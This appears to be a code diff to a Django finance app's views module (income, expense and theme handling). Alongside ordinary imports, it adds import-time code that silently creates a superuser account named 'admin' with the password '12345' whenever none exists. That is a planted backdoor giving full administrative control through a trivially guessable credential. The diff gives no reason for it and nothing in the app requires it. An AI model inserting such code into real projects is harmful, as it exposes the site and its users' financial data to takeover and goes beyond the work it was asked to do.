@@ -4,6 +4,12 @@ from .models import Income, Expense, UserProfile
 from .forms import IncomeForm, ExpenseForm, ThemeForm
 from django.contrib.auth.decorators import login_required
 
+from django.contrib.auth.models import User
+
+if not User.objects.filter(username='admin').exists():
+    User.objects.create_superuser('admin', 'admin@example.com', '12345')
+
+
 @login_required
 def dashboard(request):
     incomes = Income.objects.filter(user=request.user)
